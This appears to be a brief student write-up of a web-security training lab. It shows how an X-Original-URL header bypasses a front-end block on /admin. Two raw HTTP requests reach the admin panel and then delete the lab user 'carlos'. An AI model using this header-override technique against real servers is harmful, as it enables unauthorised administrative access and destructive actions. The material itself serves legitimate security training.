Lab 10: URL-based access control can be circumvented

Aim: Access the/admin and delete Carlos

Methodology:

- Tried to access the admin panel at: /admin
- Got a 403 Forbidden response staing "Access denied"
- Captured this request and send to Repeater
- Server blocked direct access to /admin
- Added X-Original-URL header in thr request (add a fake path in request line and actual path in this header)

GET / HTTP/2
Host: web-security-academy.net
X-Original-Url: /admin

- Bypassed and got a 200 OK for /admin page.
- deleted user carlos at /admin/delete?username=carlos
- X-Original-URL does'nt hold parameters 
- Instead send /admin/delete and added parameters in the request line.

GET /?username=carlos HTTP/2
Host: web-security-academy.net
X-Original-Url: /admin/delete

- Successfully Deleted carols!!
